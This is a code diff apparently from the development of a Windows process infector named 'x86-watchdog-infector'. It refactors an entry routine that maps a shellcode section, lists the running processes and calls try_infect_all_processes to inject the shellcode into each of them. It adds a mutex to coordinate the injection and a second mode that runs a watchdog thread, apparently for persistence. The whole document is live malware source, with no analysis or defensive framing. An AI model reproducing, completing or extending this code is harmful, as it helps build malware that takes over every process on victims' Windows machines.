@@ -3,10 +3,11 @@
 
 #include "x86-watchdog-infector.h"
 
-int __stdcall entry2(PVOID shell_base,
-                     SIZE_T shell_size,
-                     ULONGLONG proc_id,
-                     WCHAR path[MAX_PATH + 1])
+int
+initialize(PVOID shell_base,
+           SIZE_T shell_size,
+           ULONGLONG proc_id,
+           WCHAR path[MAX_PATH + 1])
 {
   int ret = 0;
   struct dll_imports imports;
@@ -50,8 +51,6 @@ int __stdcall entry2(PVOID shell_base,
 
   struct watchdog_info* p_watchdog_info = p_map;
 
-  p_watchdog_info->lock = 0;
-
   size_t path_len = libc_wstrlen(path);
   size_t path_b_len = path_len * sizeof *path;
 
@@ -61,20 +60,29 @@ int __stdcall entry2(PVOID shell_base,
   p_watchdog_info->path[MAX_PATH] = 0;
   p_watchdog_info->proc_id = proc_id;
 
-  PSYSTEM_PROCESS_INFORMATION p_spi;
-
-  if (process_list(&imports, &p_spi) < 0) {
+  HANDLE mutex = imports.CreateMutexA(NULL, FALSE, NULL);
+  if (mutex == NULL) {
     ret = -4;
     goto unmap_section;
   }
 
-  if (try_infect_all_processes(&imports, section, shell_base, shell_size) < 0) {
+  PSYSTEM_PROCESS_INFORMATION p_spi;
+
+  if (process_list(&imports, &p_spi) < 0) {
     ret = -5;
+    goto close_mutex;
+  }
+
+  if (try_infect_all_processes(
+        &imports, section, shell_base, shell_size, mutex) < 0) {
+    ret = -6;
     goto free_spi;
   }
 
 free_spi:
   imports.VirtualFree(p_spi, 0, MEM_RELEASE);
+close_mutex:
+  imports.CloseHandle(mutex);
 unmap_section:
   if (ret < 0) {
     imports.NtUnmapViewOfSection(/* Current process */ INVALID_HANDLE_VALUE,
@@ -88,10 +96,18 @@ close_section:
   return ret;
 }
 
-int
-entry(void)
+int __stdcall entry(struct meta_param* param)
 {
-  WCHAR path[] = L"C:\\Windows\\System32\\win32calc.exe";
-  entry2(GetModuleHandle(NULL), 0x5000, 6180, path);
+  if (param->kind == Shell) {
+    struct shell_param* shell_param = (PVOID)param;
+    return initialize(shell_param->shell_base,
+                      shell_param->shell_size,
+                      shell_param->proc_id,
+                      shell_param->path);
+  } else if (param->kind == Watchdog) {
+    struct watchdog_param* watchdog_param = (PVOID)param;
+    ThreadProc(&watchdog_param->param);
+  }
+
   return 0;
 }
